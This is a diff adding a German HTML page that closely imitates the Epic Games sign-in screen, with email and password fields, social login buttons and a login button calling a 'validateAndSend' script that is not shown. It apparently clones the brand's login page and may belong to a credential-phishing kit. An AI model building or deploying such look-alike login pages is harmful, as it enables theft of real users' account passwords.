@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anmeldung bei deinem Epic Games Konto</title>
+    <link rel="icon" type="image/x-icon" href="Epic-Games-logo-3768070820 (1).ico">
+    <link rel="stylesheet" href="styles.css">
+    <script defer src="script.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <img src="logo.png" alt="Epic Games Logo">
+            </div>
+            <h2>Anmelden</h2>
+            <div class="input_group">
+                <input type="email" placeholder="E-Mail-Adresse" id="email" class="email_input_login">
+                <span class="error_message" id="email_error">Erforderlich</span>
+            </div>
+            <div class="password_container input_group">
+                <input type="password" placeholder="Passwort" id="password" class="password_input_login">
+                <span class="error_message" id="password_error">Erforderlich</span>
+                <button type="button" class="password_toggle" onclick="togglePassword()">
+                    <img src="eye_icon.png" alt="show password">
+                </button>
+            </div>
+            <a href="forgot_password.html" class="fp_a">Passwort vergessen?</a>
+            <br>
+            <button class="login_button disabled" onclick="validateAndSend()" disabled>Anmelden</button>
+            <div class="divider">
+                <span>oder melde dich an mit</span>
+            </div>
+            <div class="social_buttons">
+                <button class="social_button xbox"></button>
+                <button class="social_button ps"></button>
+                <button class="social_button nintendo"></button>
+                <button class="social_button steam"></button>
+                <button class="social_button facebook"></button>
+                <button class="social_button google"></button>
+                <button class="social_button apple"></button>
+                <button class="social_button lego"></button>
+            </div>
+            <a href="konto_erstellen.html" class="ke_a">Konto erstellen</a>
+        </div>
+    </div>
+</body>
+</html>
